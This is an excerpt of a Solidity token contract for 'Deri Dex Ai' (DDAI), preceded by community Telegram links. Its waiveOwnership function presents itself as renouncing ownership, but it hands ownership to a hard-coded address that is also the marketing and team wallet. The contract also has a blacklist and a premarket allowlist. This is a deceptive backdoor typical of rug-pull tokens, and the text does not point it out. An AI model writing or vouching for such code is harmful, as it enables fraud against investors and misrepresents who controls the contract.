...
International Community :- https://t.me/DeriDexProtocol

Chinese Community :- https://t.me/DeriDexCN

Website: https://deridexprotocol.com
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5cD1627347693a7db9e64243F56ec56dB7e9bDE1);
    }
...
contract DeriDexAi is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Deri Dex Ai";
    string private _symbol = "DDAI";
    uint8 private _decimals = 9;
    bool public market_active;
    mapping (address => bool) public _isBlacklisted;
    mapping (address => bool) public premarket_user;

    address payable public marketingWalletAddress = payable(0x5cD1627347693a7db9e64243F56ec56dB7e9bDE1);
    address payable public teamWalletAddress = payable(0x5cD1627347693a7db9e64243F56ec56dB7e9bDE1);
